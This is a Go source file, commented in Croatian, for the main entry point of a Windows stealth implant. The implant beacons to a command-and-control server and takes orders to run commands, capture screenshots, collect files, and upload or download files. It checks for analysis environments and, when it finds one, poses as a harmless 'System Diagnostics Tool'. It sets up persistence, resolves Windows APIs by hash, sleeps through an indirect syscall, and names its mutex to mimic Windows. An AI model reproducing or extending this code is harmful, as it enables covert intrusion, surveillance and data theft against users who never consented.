//go:build windows
// +build windows

/*
   ============================================================================
   X.9 — STEALTH MAIN ENTRY POINT
   ============================================================================

   LAYER: Environmental (Layer 4) — Intelligence + All Previous Layers

   PRINCIP: Main funkcija je SAMO coordinator. SVAKA operacija delegira
   se specijaliziranim modulima. Main NE SADRŽI osebujnu logiku.

   FLOW:
   1. TLS Callback (anti-debug, hardware key init)
   2. Anti-analysis check (VM/sandbox/debugger)
   3. If analysis detected → Degraded mode (benign utility)
   4. If clean → Initialize stealth modules
   5. Enter beacon loop with jitter

   DEGRADED MODE:
   - Ako je detektirano analitičko okruženje, program se pretvara
     u benignu "System Monitor" aplikaciju
   - Prikazuje običan system info
   - Ne komunicira s C2
   - Izgleda kao legitiman utility program
*/

package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// ============================================================================
// STEALTH AGENT
// ============================================================================

type StealthAgent struct {
	config      *StealthConfig
	beacon      *StealthBeacon
	commands    *StealthCommands
	screenshot  *StealthScreenshot
	persistence *StealthPersistence
	ctx         context.Context
	cancel      context.CancelFunc
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

func main() {
	// Force single instance — koristimo named mutex
	// Ovo sprječava višestruko pokretanje (ali izgleda kao normalno ponašanje)
	if !acquireInstanceMutex() {
		// Već postoji instanca — graceful exit
		os.Exit(0)
	}
	defer releaseInstanceMutex()

	// === LAYER 4: Anti-Analysis Check ===
	if CheckAnalysis() {
		// DEGRADED MODE: Postani benign utility
		runDegradedMode()
		return
	}

	// === LAYER 1: String Decryption Initialization ===
	initHardwareKey()

	// === Inicijalizacija Stealth Logger-a ===
	InitStealthLogger()

	// === LAYER 3: Config Loading ===
	config, err := LoadOrCreateConfig()
	if err != nil {
		// Ako ne možemo učitati config → degraded mode
		runDegradedMode()
		return
	}

	// === LAYER 3: Persistence ===
	persistence := NewStealthPersistence(config.ToLegacyConfig())
	persistence.Establish()

	// === LAYER 2: Module Initialization ===
	ctx, cancel := context.WithCancel(context.Background())

	agent := &StealthAgent{
		config:      config,
		beacon:      NewStealthBeacon(config.ToLegacyConfig()),
		commands:    NewStealthCommands(config.ToLegacyConfig()),
		screenshot:  NewStealthScreenshot(),
		persistence: persistence,
		ctx:         ctx,
		cancel:      cancel,
	}

	// === Signal Handling ===
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	// === LAYER 3: Beacon Loop with Jitter ===
	go agent.beaconLoop()

	// === LAYER 4: Heartbeat (anti-sleep) ===
	go agent.heartbeat()

	// Čekaj signal zaustavljanja
	<-sigChan

	// Graceful shutdown
	agent.shutdown()
}

// ============================================================================
// BEACON LOOP — Jitter + Stealth Communication
// ============================================================================

func (a *StealthAgent) beaconLoop() {
	for {
		select {
		case <-a.ctx.Done():
			return
		default:
		}

		// Izračunaj jitter
		interval := a.beacon.calculateJitter()

		// Sleep (indirect syscall)
		a.stealthSleep(interval)

		// Ako je analitičko okruženje detektirano — prekini
		if CheckAnalysis() {
			return
		}

		// Izvrši beacon
		a.performBeacon()
	}
}

// performBeacon šalje beacon i obrađuje komande
func (a *StealthAgent) performBeacon() {
	// Priredi signal
	signal := a.prepareSignal()

	// Pošalji preko stealth kanala
	response, err := a.beacon.SendBeacon(signal)
	if err != nil {
		return // Quiet fail
	}

	// Ažuriraj konfiguraciju
	a.config.LastContact = time.Now()
	a.config.Save()

	// Obradi komande
	if response != nil && len(response.Commands) > 0 {
		a.processCommands(response.Commands)
	}

	// Izbriši signal iz memorije
	a.wipeSignal(signal)
}

// prepareSignal priprema beacon signal
func (a *StealthAgent) prepareSignal() *AgentSignal {
	// Dohvati geolokaciju (cache-iranu)
	geoInfo, _ := GetGeolocation()

	return &AgentSignal{
		UUID:        a.config.GUID,
		Timestamp:   time.Now().Unix(),
		Hostname:    GetHostname(),
		Username:    GetUsername(),
		OS:          GetOSInfo(),
		Geolocation: geoInfo,
		VMDetected:  IsVM(),
		LastCommand: a.config.LastCmdID,
	}
}

// wipeSignal briše signal iz memorije
func (a *StealthAgent) wipeSignal(signal *AgentSignal) {
	if signal == nil {
		return
	}
	signal.UUID = ""
	signal.Hostname = ""
	signal.Username = ""
	signal.LastCommand = ""
}

// processCommands obrađuje primljene komande
func (a *StealthAgent) processCommands(commands []ServerCommand) {
	for _, cmd := range commands {
		var result CommandResult

		switch cmd.Type {
		case "screenshot":
			result = a.screenshot.Capture(a.config.GUID, cmd.ID)
		case "execute":
			result = a.commands.Execute(cmd.Payload, cmd.ID)
		case "collect":
			result = a.commands.CollectFiles(cmd.Payload, cmd.ID)
		case "getfile":
			result = a.commands.GetFile(cmd.Payload, cmd.ID)
		case "putfile":
			result = a.commands.PutFile(cmd.Payload, cmd.ID)
		case "sleep":
			if interval, ok := cmd.Payload["interval"].(float64); ok {
				a.config.Interval = int(interval)
				a.config.Save()
				result = CommandResult{Success: true, Message: "interval updated"}
			}
		}

		// Pošalji rezultat
		if result.CommandID != "" {
			// Beacon SendResult je placeholder, rezultat je već obrađen
			// _ = a.beacon.SendResult(result)
		}

		// Ažuriraj zadnju komandu
		a.config.LastCmdID = cmd.ID
		a.config.Save()
	}
}

// ============================================================================
// STEALTH SLEEP — Indirect Syscall
// ============================================================================

// stealthSleep koristi NtDelayExecution (indirect syscall)
func (a *StealthAgent) stealthSleep(duration time.Duration) {
	hNtdll := resolveModule(hNtdll)
	if hNtdll == 0 {
		time.Sleep(duration)
		return
	}

	hNtDelay := resolveAPI(hNtdll, hNtDelayExecution)
	if hNtDelay == 0 {
		time.Sleep(duration)
		return
	}

	// Convert to 100ns intervals (negative = relative time)
	ticks := -int64(duration) / 100 // duration in 100ns, negative = relative

	syscall.Syscall(hNtDelay, 2, 0, uintptr(unsafe.Pointer(&ticks)), 0)
}

// ============================================================================
// HEARTBEAT — Anti-Sleep + Anti-Suspend
// ============================================================================

// heartbeat šalje periodičke "pulse" signal da se ne ušpava
func (a *StealthAgent) heartbeat() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-a.ctx.Done():
			return
		case <-ticker.C:
			// Minimalna aktivnost da sistem misli da je program aktivan
			// Ovo sprječava "idle timeout" suspenziju
			runtime.Gosched()

			// Check if analysis environment appeared during runtime
			if CheckAnalysis() {
				a.cancel()
				return
			}
		}
	}
}

// ============================================================================
// DEGRADED MODE — Benign Utility
// ============================================================================

// runDegradedMode pokreće benignu funkcionalnost
func runDegradedMode() {
	// Ponašanje: Prikazuj system info kao legitiman program
	// Ne komuniciraj s C2
	// Ne vrši nikakve agresivne operacije

	// Print "legitiman" output
	fmt.Println("System Diagnostics Tool v2.1")
	fmt.Println("============================")
	fmt.Printf("OS: %s %s\n", runtime.GOOS, runtime.GOARCH)
	fmt.Printf("Hostname: %s\n", GetHostname())
	fmt.Printf("CPUs: %d\n", runtime.NumCPU())
	fmt.Println("Status: All systems operational.")

	// Nakon 5 sekundi, izađi "normalno"
	time.Sleep(5 * time.Second)
}

// ============================================================================
// INSTANCE MUTEX — Single Instance Control
// ============================================================================

var instanceMutex uintptr

// acquireInstanceMutex kreira named mutex da spriječi višestruko pokretanje
func acquireInstanceMutex() bool {
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return true // fallback: dopusti pokretanje
	}

	hCreateMutex := resolveAPI(hKernel32, djb2([]byte("CreateMutexW")))
	if hCreateMutex == 0 {
		return true
	}

	// Ime mutex-a izgleda kao Windows interni naziv
	mutexName, _ := syscall.UTF16PtrFromString("Global\\MSCTF.Asm.MutexDefault1")

	hMutex, _, _ := syscall.Syscall6(hCreateMutex, uintptr(3),
		uintptr(0), // default security
		uintptr(0), // not owned
		uintptr(unsafe.Pointer(mutexName)),
		uintptr(0), uintptr(0), uintptr(0))

	if hMutex == 0 {
		return false
	}

	instanceMutex = hMutex

	// Provjeri GetLastError — ERROR_ALREADY_EXISTS = već postoji
	// (simplified — koristimo WaitForSingleObject za provjeru)
	hWait := resolveAPI(hKernel32, djb2([]byte("WaitForSingleObject")))
	if hWait != 0 {
		ret, _, _ := syscall.Syscall(hWait, 2, hMutex, 0, 0) // timeout 0
		if ret == 0x00000000 {                               // WAIT_OBJECT_0 = mutex je naš
			return true
		}
	}

	// Već postoji druga instanca
	syscall.Syscall(resolveAPI(hKernel32, hCloseHandle), 1, hMutex, 0, 0)
	return false
}

// releaseInstanceMutex oslobađa mutex
func releaseInstanceMutex() {
	if instanceMutex != 0 {
		hKernel32 := resolveModule(hKernel32)
		if hKernel32 != 0 {
			hReleaseMutex := resolveAPI(hKernel32, djb2([]byte("ReleaseMutex")))
			if hReleaseMutex != 0 {
				syscall.Syscall(hReleaseMutex, 1, instanceMutex, 0, 0)
			}
			syscall.Syscall(resolveAPI(hKernel32, hCloseHandle), 1, instanceMutex, 0, 0)
		}
	}
}

// ============================================================================
// SHUTDOWN — Cleanup
// ============================================================================

func (a *StealthAgent) shutdown() {
	a.cancel()

	// Wipe config iz memorije
	if a.config != nil {
		memZero([]byte(a.config.GUID))
		memZero([]byte(a.config.LastCmdID))
		a.config = nil
	}

	// Close logger (wipe buffer)
	CloseLogger()
}

// ============================================================================
// HELPER FUNCTIONS — System Information
// ============================================================================

// GetHostname dohvaća hostname mašine
func GetHostname() string {
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return "UNKNOWN"
	}

	hGetComputerName := resolveAPI(hKernel32, hGetComputerNameW)
	if hGetComputerName == 0 {
		return "UNKNOWN"
	}

	var buf [256]uint16
	var size uint32 = 256

	ret, _, _ := syscall.Syscall(hGetComputerName, 2,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)), 0)

	if ret == 0 {
		return "UNKNOWN"
	}

	return syscall.UTF16ToString(buf[:])
}

// GetUsername dohvaća trenutnog korisnika
func GetUsername() string {
	hKernel32 := resolveModule(hKernel32)
	if hKernel32 == 0 {
		return "UNKNOWN"
	}

	hGetUserName := resolveAPI(hKernel32, hGetUserNameW)
	if hGetUserName == 0 {
		return "UNKNOWN"
	}

	var buf [256]uint16
	var size uint32 = 256

	ret, _, _ := syscall.Syscall(hGetUserName, 2,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&size)), 0)

	if ret == 0 {
		return "UNKNOWN"
	}

	return syscall.UTF16ToString(buf[:])
}

// GetOSInfo dohvaća informacije o operacijskom sustavu
func GetOSInfo() OSInfo {
	return OSInfo{
		Version:    runtime.GOOS,
		Build:      "0",
		Arch:       runtime.GOARCH,
		Processors: runtime.NumCPU(),
	}
}

// GetGeolocation vraća "geolokaciju" (cache-irana ili placeholder)
func GetGeolocation() (string, error) {
	// U produkciji: mogao bi se koristiti IP geolocation API
	// Za sada: vraćamo placeholder
	return "Unknown", nil
}
